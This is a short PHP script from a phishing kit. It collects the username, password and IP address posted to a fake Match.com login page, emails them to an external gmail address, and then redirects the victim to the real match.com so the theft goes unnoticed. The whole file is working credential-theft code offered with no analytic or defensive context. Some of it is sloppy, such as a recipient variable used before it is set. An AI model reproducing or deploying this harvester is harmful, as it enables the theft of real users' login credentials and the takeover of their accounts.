<?php
$result = "match";
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "match Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";

mail($recipient,$result,$message);

$recipient = "sleemlogs@gmail.com";
$subject = "Result!!!";
$headers = "From: gmail <Match@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$result,$message,$headers))

{
?>                    
	
		   <script language=javascript>
window.location='https://www.match.com/';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>